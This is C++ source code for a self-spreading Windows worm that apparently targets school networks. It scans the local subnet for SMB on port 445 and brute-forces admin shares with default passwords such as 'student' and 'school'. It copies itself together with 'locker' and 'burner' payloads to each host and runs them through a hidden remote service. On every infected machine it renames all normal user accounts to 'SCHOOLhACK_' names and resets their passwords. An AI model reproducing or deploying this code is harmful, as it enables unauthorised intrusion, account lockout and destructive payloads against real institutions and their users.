#include <windows.h>
#include <lm.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include "config.h"

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

std::wstring ExePath() {
    wchar_t b[MAX_PATH];
    GetModuleFileNameW(nullptr, b, MAX_PATH);
    return b;
}

bool IsSource() {
    return GetFileAttributesW(MARKER_PATH) != INVALID_FILE_ATTRIBUTES;
}

std::wstring Dir() {
    std::wstring s = ExePath();
    auto p = s.find_last_of(L'\\');
    return p == std::wstring::npos ? L"." : s.substr(0, p);
}

bool Open(const std::wstring& ip, const std::wstring& u, const std::wstring& p) {
    NETRESOURCEW nr = {};
    nr.dwType = RESOURCETYPE_DISK;
    std::wstring c = L"\\\\" + ip + L"\\C$";
    nr.lpRemoteName = const_cast<LPWSTR>(c.c_str());
    DWORD r = WNetAddConnection2W(&nr, p.c_str(), u.c_str(), 0);
    return r == NO_ERROR || r == ERROR_ALREADY_ASSIGNED;
}

void Close(const std::wstring& ip) {
    WNetCancelConnection2W((L"\\\\" + ip + L"\\C$").c_str(), 0, TRUE);
}

bool CopyP(const std::wstring& ip, const std::wstring& lp, const std::wstring& rn) {
    return CopyFileW(lp.c_str(),
        (L"\\\\" + ip + L"\\C$\\Windows\\Temp\\" + rn).c_str(), FALSE) != 0;
}

bool RunRemote(const std::wstring& ip, const std::wstring& exe) {
    std::wstring s1 = L"cmd.exe /c \"sc \\\\" + ip + L" delete " + SVC_NAME + L" >nul 2>&1\"";
    std::wstring s2 = L"cmd.exe /c \"sc \\\\" + ip + L" create " + SVC_NAME +
        L" binPath= \\\"C:\\Windows\\Temp\\" + exe + L"\\\" start= auto >nul 2>&1\"";
    std::wstring s3 = L"cmd.exe /c \"sc \\\\" + ip + L" start " + SVC_NAME + L" >nul 2>&1\"";

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    for (auto* c : { &s1, &s2, &s3 }) {
        PROCESS_INFORMATION pi = {};
        if (CreateProcessW(nullptr, c->data(), nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    return true;
}

void Hijack() {
    LPUSER_INFO_0 b = nullptr;
    DWORD n = 0, t = 0;
    if (NetUserEnum(nullptr, 0, FILTER_NORMAL_ACCOUNT,
        (LPBYTE*)&b, MAX_PREFERRED_LENGTH, &n, &t, nullptr) != NERR_Success) return;

    for (DWORD i = 0; i < n; i++) {
        std::wstring nm = b[i].usri0_name;
        if (_wcsicmp(nm.c_str(), L"Administrator") == 0 ||
            _wcsicmp(nm.c_str(), L"Guest") == 0 ||
            _wcsicmp(nm.c_str(), L"DefaultAccount") == 0) continue;

        std::wstring nn = L"SCHOOLhACK_" + std::to_wstring(i + 1);
        USER_INFO_0 ri = {};
        ri.usri0_name = const_cast<LPWSTR>(nn.c_str());
        NetUserSetInfo(nullptr, b[i].usri0_name, 0, (LPBYTE)&ri, nullptr);

        USER_INFO_1003 ui = {};
        ui.usri1003_password = const_cast<LPWSTR>(NEW_PASSWORD.c_str());
        NetUserSetInfo(nullptr, nn.c_str(), 1003, (LPBYTE)&ui, nullptr);
    }
    NetApiBufferFree(b);
}

std::wstring LocalIP() {
    WSADATA w;
    if (WSAStartup(MAKEWORD(2,2), &w) != 0) return L"";
    char h[256] = {};
    gethostname(h, sizeof(h));
    addrinfo hi = {}, *r = nullptr;
    hi.ai_family = AF_INET;
    std::wstring out;
    if (getaddrinfo(h, nullptr, &hi, &r) == 0 && r) {
        sockaddr_in* sa = (sockaddr_in*)r->ai_addr;
        wchar_t ip[32];
        InetNtopW(AF_INET, &sa->sin_addr, ip, 32);
        out = ip;
        freeaddrinfo(r);
    }
    WSACleanup();
    return out;
}

std::vector<std::wstring> Scan() {
    std::vector<std::wstring> h;
    std::wstring loc = LocalIP();
    if (loc.empty()) return h;
    auto d = loc.find_last_of(L'.');
    if (d == std::wstring::npos) return h;
    std::wstring pre = loc.substr(0, d + 1);

    WSADATA w;
    if (WSAStartup(MAKEWORD(2,2), &w) != 0) return h;

    for (int i = 1; i < 255; i++) {
        std::wstring ip = pre + std::to_wstring(i);
        if (ip == loc) continue;
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in a = {};
        a.sin_family = AF_INET;
        a.sin_port = htons(445);
        InetPtonW(AF_INET, ip.c_str(), &a.sin_addr);
        u_long nb = 1;
        ioctlsocket(s, FIONBIO, &nb);
        connect(s, (sockaddr*)&a, sizeof(a));
        fd_set f;
        FD_ZERO(&f);
        FD_SET(s, &f);
        timeval tv = { 0, 150000 };
        if (select(0, nullptr, &f, nullptr, &tv) > 0)
            h.push_back(ip);
        closesocket(s);
    }
    WSACleanup();
    return h;
}

bool FilesExist(const std::vector<std::pair<std::wstring, std::wstring>>& files) {
    for (auto& f : files)
        if (GetFileAttributesW(f.first.c_str()) == INVALID_FILE_ATTRIBUTES)
            return false;
    return true;
}

int wmain() {
    std::wstring d = Dir();
    std::vector<std::pair<std::wstring, std::wstring>> files = {
        { ExePath(),                    PAYLOAD_NAME },
        { d + L"\\" + LOCKER_NAME,      LOCKER_NAME },
        { d + L"\\" + BURNER_NAME,      BURNER_NAME },
        { d + L"\\" + INSTALLER_NAME,   INSTALLER_NAME },
    };

    if (!FilesExist(files)) {
        std::wcerr << L"[!] missing payloads next to worm.exe\n";
        return 1;
    }

    if (!IsSource()) {
        Hijack();
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        std::wstring inst = d + L"\\" + INSTALLER_NAME;
        if (CreateProcessW(inst.c_str(), nullptr, nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 15000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        for (auto* n : { BURNER_NAME, LOCKER_NAME }) {
            PROCESS_INFORMATION pi2 = {};
            std::wstring exe = d + L"\\" + n;
            CreateProcessW(exe.c_str(), nullptr, nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi2);
            if (pi2.hProcess) { CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread); }
        }
        return 0;
    }

    {
        std::wstring mp = MARKER_PATH;
        auto slash = mp.find_last_of(L'\\');
        if (slash != std::wstring::npos) {
            std::wstring dir = mp.substr(0, slash);
            typedef int(WINAPI* PFN_SHDIR)(HWND, const wchar_t*, void*);
            HMODULE sh = LoadLibraryW(L"shell32.dll");
            if (sh) {
                auto fn = (PFN_SHDIR)GetProcAddress(sh, "SHCreateDirectoryExW");
                if (fn) fn(nullptr, dir.c_str(), nullptr);
                FreeLibrary(sh);
            }
        }
        std::ofstream m(mp);
        m << "src";
        m.close();
    }

    auto hosts = Scan();
    std::vector<std::pair<std::wstring, std::wstring>> creds = {
        { L"Administrator", L"" }, { L"Administrator", L"admin" },
        { L"Administrator", L"password" }, { L"admin", L"admin" },
        { L"admin", L"password" }, { L"user", L"user" },
        { L"student", L"student" }, { L"school", L"school" },
    };

    for (auto& ip : hosts) {
        for (auto& [u, p] : creds) {
            if (!Open(ip, u, p)) continue;
            bool ok = true;
            for (auto& f : files) ok &= CopyP(ip, f.first, f.second);
            if (ok) {
                RunRemote(ip, PAYLOAD_NAME);
                std::wcout << L"[+] hit " << ip << L" as " << u << L"\n";
            }
            Close(ip);
            if (ok) break;
        }
    }
    std::wcout << L"[*] done\n";
    return 0;
}
